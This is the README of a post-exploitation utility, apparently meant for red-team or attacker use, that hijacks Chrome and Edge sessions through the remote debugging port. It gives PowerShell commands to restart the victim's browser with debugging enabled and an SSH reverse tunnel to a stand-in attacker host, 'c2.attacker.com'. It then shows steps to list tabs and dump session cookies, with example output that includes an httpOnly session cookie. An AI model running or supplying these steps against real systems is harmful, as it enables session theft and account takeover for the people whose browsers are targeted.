# chrome-remote

> Utility for Google Chrome and Microsoft Edge Remote Debugging.

# Setup

Install with [pipx](https://github.com/pypa/pipx).

~~~ bash
pipx install git+https://github.com/dadevel/chrome-remote.git
~~~

# Usage

Restart Chrome/Edge with remote debugging enabled.

~~~ powershell
Get-Process chrome | Stop-Process
Start-Process 'C:\Program Files\Google\Chrome\Application\chrome.exe' -ArgumentList '--user-data-dir="C:\Users\jdoe\AppData\Local\Google\Chrome\User Data" --restore-last-session --remote-debugging-port=9222'
~~~

~~~ powershell
Get-Process msedge | Stop-Process
Start-Process 'C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe' -ArgumentList '--user-data-dir="C:\Users\jdoe\AppData\Local\Microsoft\Edge\User Data" --restore-last-session --remote-debugging-port=9222'
~~~

Forward `localhost:9222` back to your attacker machine.

~~~ powershell
ssh.exe -R 127.0.0.1:9222:127.0.0.1:9222 proxy@c2.attacker.com
~~~

List open tabs.

~~~
❯ chrome-remote list-tabs | jq -r '.[]'
{
  "title": "Example Domain",
  "url": "https://example.com/"
}
...
~~~

Dump session cookies.

~~~
❯ chrome-remote dump-cookies | jq -r '.[]|select(.domain == "example.com")'
{
  "name": "sessid",
  "value": "SFE0R1REZFF0NFZCVTlMbEdSTEN5QXcxZloyS0tDVDg=",
  "domain": "example.com",
  "path": "/",
  "expires": -1,
  "size": 44,
  "httpOnly": true,
  "secure": true,
  "session": true,
  "sameSite": "None",
  "priority": "Medium",
  "sameParty": false,
  "sourceScheme": "Secure",
  "sourcePort": 443
}
...
~~~

# References

- [Stealing Chrome cookies without a password](http://web.archive.org/web/20240616123506/https://mango.pdf.zone/stealing-chrome-cookies-without-a-password)
- [Post-Exploitation: Abusing Chrome's debugging feature to observe and control browsing sessions remotely](http://web.archive.org/web/20240521025448/https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)
- [Hands in the Cookie Jar: Dumping Cookies with Chromium’s Remote Debugger Port](http://web.archive.org/web/20240624212635/https://scribe.rip/@specterops/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e)
- [Debugging Cookie Dumping Failures with Chromium’s Remote Debugger](http://web.archive.org/web/20230721071951/https://scribe.rip/@slyd0g/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f)
- [Chrome DevTools Protocol Documentation](https://chromedevtools.github.io/devtools-protocol/tot/Storage/)
